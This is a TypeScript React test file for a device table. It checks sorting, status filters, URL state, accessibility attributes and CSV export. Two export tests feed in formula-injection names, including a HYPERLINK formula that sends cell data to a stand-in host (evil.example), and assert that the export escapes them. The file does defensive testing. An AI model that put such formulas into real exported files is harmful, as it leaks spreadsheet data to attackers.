import '@/test/dom-setup';

import assert from 'node:assert/strict';
import { afterEach, describe, it } from 'node:test';

import { cleanup, fireEvent, render, screen, waitFor, within } from '@testing-library/react';

import { DeviceTable } from '@/components/device-table';
import type { Device } from '@/lib/api-contracts';

afterEach(() => {
  cleanup();
  window.history.replaceState(null, '', '/');
});

function device(id: string, over: Partial<Device> = {}): Device {
  return {
    id: `device-6f1c2a9e-0b1d-5c3e-8f4a-12345678900${id}`,
    name: `sw-${id}`,
    hostname: null,
    type: 'switch',
    status: 'healthy',
    ip_addresses: [],
    mac_addresses: [],
    site_id: null,
    owner_identity_id: null,
    source_aliases: [],
    freshness: { state: 'fresh', observed_at: null, source: null },
    ...over,
  };
}

const ROWS = [
  device('1', { name: 'alpha', status: 'healthy' }),
  device('2', { name: 'bravo', status: 'critical' }),
  device('3', { name: 'charlie', status: 'critical', ip_addresses: ['10.0.0.3'] }),
];

function names(): string[] {
  return screen
    .getAllByRole('row')
    .slice(1)
    .map((row) => within(row).getAllByRole('link')[0].textContent ?? '');
}

describe('DeviceTable', () => {
  it('neutralises a hostile device name in the export', async () => {
    const hostile = '=HYPERLINK("http://evil.example/?x="&A1,"click")';
    let exported = '';
    const original = URL.createObjectURL;
    URL.createObjectURL = (blob: Blob | MediaSource) => {
      void (blob as Blob).text().then((text) => (exported = text));
      return 'blob:test';
    };
    URL.revokeObjectURL = () => undefined;
    window.HTMLAnchorElement.prototype.click = () => undefined;
    try {
      render(<DeviceTable devices={[device('1', { name: hostile })]} total={1} />);
      fireEvent.click(screen.getByRole('button', { name: 'Export CSV, 1 devices' }));
      await waitFor(() => assert.ok(exported.length > 0));
      const dataRow = exported.split('\r\n')[1];
      assert.ok(dataRow.includes(`"'=HYPERLINK(""http://evil.example/?x=""&A1,""click"")"`), dataRow);
      assert.ok(!/(^|,)=/.test(dataRow), 'no cell starts with =');
    } finally {
      URL.createObjectURL = original;
    }
  });

  it('says the filters only cover the loaded page', () => {
    render(<DeviceTable devices={ROWS} total={120} />);
    assert.match(document.body.textContent ?? '', /3 shown \/ 120 total/);
    assert.match(document.body.textContent ?? '', /this page/i);
  });

  it('does not call an empty page "all of them"', () => {
    render(<DeviceTable devices={[]} total={0} />);
    assert.match(document.body.textContent ?? '', /No devices are loaded on this page\./);
    assert.doesNotMatch(document.body.textContent ?? '', /all of them/);
  });

  it('sorts by a column and announces the direction', () => {
    render(<DeviceTable devices={ROWS} total={3} />);
    const button = screen.getByRole('button', { name: /Sort by Device/ });
    fireEvent.click(button);
    assert.deepEqual(names(), ['alpha', 'bravo', 'charlie']);
    fireEvent.click(screen.getByRole('button', { name: /Sort by Device/ }));
    assert.deepEqual(names(), ['charlie', 'bravo', 'alpha']);
    assert.match(screen.getByRole('button', { name: /Sort by Device/ }).getAttribute('aria-label') ?? '', /descending/);
  });

  it('filters by a status chip and offers a clear control with a filtered-empty state', () => {
    render(<DeviceTable devices={ROWS} total={3} />);
    const chip = screen.getByRole('button', { name: /critical \(2\)/i });
    fireEvent.click(chip);
    assert.equal(chip.getAttribute('aria-pressed'), 'true');
    assert.deepEqual(names(), ['bravo', 'charlie']);
    fireEvent.change(screen.getByRole("searchbox"), { target: { value: 'zzz' } });
    assert.match(document.body.textContent ?? '', /No devices match/);
    fireEvent.click(screen.getAllByRole('button', { name: /Clear filters/ })[0]);
    assert.equal(names().length, 3);
  });

  it('shows zero-count statuses as disabled, never hidden', () => {
    render(<DeviceTable devices={ROWS} total={3} />);
    const chip = screen.getByRole('button', { name: /offline \(0\)/i });
    assert.equal((chip as HTMLButtonElement).disabled, true);
  });

  it('links an owner to the identity page when one is recorded', () => {
    render(
      <DeviceTable
        devices={[device('1', { owner_identity_id: 'person-6f1c2a9e-0b1d-5c3e-8f4a-123456789abc' })]}
        total={1}
      />,
    );
    assert.ok(screen.getByRole('link', { name: /Owner/ }).getAttribute('href')?.startsWith('/users/'));
  });

  it('marks the sorted column with aria-sort and the others none; unsortable columns carry none', () => {
    render(<DeviceTable devices={ROWS} total={3} />);
    const header = (name: RegExp) => screen.getByRole('columnheader', { name });
    assert.equal(header(/Device/).getAttribute('aria-sort'), 'none');
    fireEvent.click(screen.getByRole('button', { name: /Sort by Device/ }));
    assert.equal(header(/Device/).getAttribute('aria-sort'), 'ascending');
    assert.equal(header(/Status/).getAttribute('aria-sort'), 'none');
    fireEvent.click(screen.getByRole('button', { name: /Sort by Device/ }));
    assert.equal(header(/Device/).getAttribute('aria-sort'), 'descending');
    assert.equal(header(/Owner/).getAttribute('aria-sort'), null);
  });

  it('offers the scroll area as a labelled, focusable region', () => {
    render(<DeviceTable devices={ROWS} total={3} />);
    const region = screen.getByRole('region', { name: /Devices table/ });
    assert.equal(region.getAttribute('tabindex'), '0');
  });

  it('moves focus to the search box when filters are cleared', () => {
    render(<DeviceTable devices={ROWS} total={3} />);
    fireEvent.change(screen.getByRole('searchbox'), { target: { value: 'bravo' } });
    fireEvent.click(screen.getByRole('button', { name: /Clear filters/ }));
    assert.equal(document.activeElement, screen.getByRole('searchbox'));
  });

  it('keeps search, status and sort in the URL and reads them back on load', () => {
    window.history.replaceState(null, '', '/?q=bravo&status=critical&sort=-name');
    render(<DeviceTable devices={ROWS} total={3} />);
    assert.deepEqual(names(), ['bravo']);
    assert.equal((screen.getByRole('searchbox') as HTMLInputElement).value, 'bravo');
    assert.equal(screen.getByRole('columnheader', { name: /Device/ }).getAttribute('aria-sort'), 'descending');
  });

  it('writes filter changes to the URL, keeping unrelated parameters', () => {
    window.history.replaceState(null, '', '/?page=2');
    render(<DeviceTable devices={ROWS} total={3} />);
    fireEvent.change(screen.getByRole('searchbox'), { target: { value: 'alp ha' } });
    fireEvent.click(screen.getByRole('button', { name: /critical \(2\)/ }));
    const params = new URLSearchParams(window.location.search);
    assert.equal(params.get('q'), 'alp ha');
    assert.equal(params.get('status'), 'critical');
    assert.equal(params.get('page'), '2');
  });

  it('filters to zero results, then Clear filters resets the URL and restores the rows', async () => {
    render(<DeviceTable devices={ROWS} total={3} />);
    fireEvent.change(screen.getByRole('searchbox'), { target: { value: 'nothing-matches' } });
    await waitFor(() => assert.match(window.location.search, /q=nothing-matches/));
    assert.ok(screen.getByText('No devices match these filters'));
    const empty = screen.getByText('No devices match these filters').closest('.card') as HTMLElement;
    fireEvent.click(within(empty).getByRole('button', { name: 'Clear filters' }));
    assert.equal(window.location.search, '');
    assert.deepEqual(names(), ['alpha', 'bravo', 'charlie']);
    assert.equal((screen.getByRole('searchbox') as HTMLInputElement).value, '');
  });

  it('exports exactly the rows in view, with formula-looking cells neutralised', async () => {
    let exported = '';
    const original = URL.createObjectURL;
    URL.createObjectURL = (blob: Blob | MediaSource) => {
      void (blob as Blob).text().then((text) => (exported = text));
      return 'blob:test';
    };
    URL.revokeObjectURL = () => undefined;
    window.HTMLAnchorElement.prototype.click = () => undefined;
    try {
      render(
        <DeviceTable
          devices={[device('1', { name: '=cmd()', status: 'critical' }), device('2', { name: 'plain' })]}
          total={2}
        />,
      );
      fireEvent.click(screen.getByRole('button', { name: /critical \(1\)/ }));
      fireEvent.click(screen.getByRole('button', { name: 'Export CSV, 1 devices' }));
      await new Promise((resolve) => setTimeout(resolve, 20));
      const lines = exported.trim().split(/\r?\n/);
      assert.equal(lines.length, 2);
      assert.match(lines[1], /^critical,'=cmd\(\)/);
    } finally {
      URL.createObjectURL = original;
    }
  });
});
